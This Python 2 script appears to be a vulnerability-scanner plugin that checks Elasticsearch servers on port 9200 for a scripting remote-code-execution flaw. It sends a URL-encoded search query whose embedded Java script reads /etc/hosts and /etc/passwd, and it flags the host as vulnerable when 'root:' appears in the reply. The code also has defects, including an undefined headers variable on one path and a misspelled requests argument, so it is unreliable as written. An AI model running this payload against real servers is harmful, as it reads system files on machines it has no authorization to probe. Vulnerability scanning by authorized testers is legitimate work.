#!/usr/bin/env python
# coding=utf-8

import urlparse
import requests
import urllib
import socket

def get_addr(hostname):
    addr =socket.gethostbyname(hostname)
    return addr

def verify(ip, port=80, name='', timeout=10, types='ip'):
    '''
    payload from awvs decode script: Bash_RCE_Server_Audit.script
    '''

    if types == 'ip':
        addr = ip
    else:
        url = ip
        if not url.startswith("http:") or not url.startswith("https:"):
            url = 'http://' + url
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
                    'Connection': 'close'}
        
        parsed_url = urlparse.urlparse(url)
        # base_url = parsed_url.scheme + "://" + parsed_url.netloc
        addr = get_addr(parsed_url.netloc)

    payload = "/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22%2Fetc%2Fhosts%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fhosts%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%2C%22%2Fetc%2Fpasswd%22%3A%7B%22script%22%3A%22import%20java.util.*%3B%5Cnimport%20java.io.*%3B%5Cnnew%20Scanner(new%20File(%5C%22%2Fetc%2Fpasswd%5C%22)).useDelimiter(%5C%22%5C%5C%5C%5CZ%5C%22).next()%3B%22%7D%7D%7D&callback=z"
    
    url = 'http' + "://" + addr + ":9200" + payload

    info = {
        'url': url,
        'severity': 'high',
        'vuln_name': 'es rce',
        'proof': ':root:'
    }

    try:
        resp = requests.get(url, headers=headers, allow_redirects=False, verfiy=False)
        html = resp.content
        if ',"/etc/passwd":["root:' in html:
            return info
        else:
            return False
    except Exception as e:
        pass

    return False
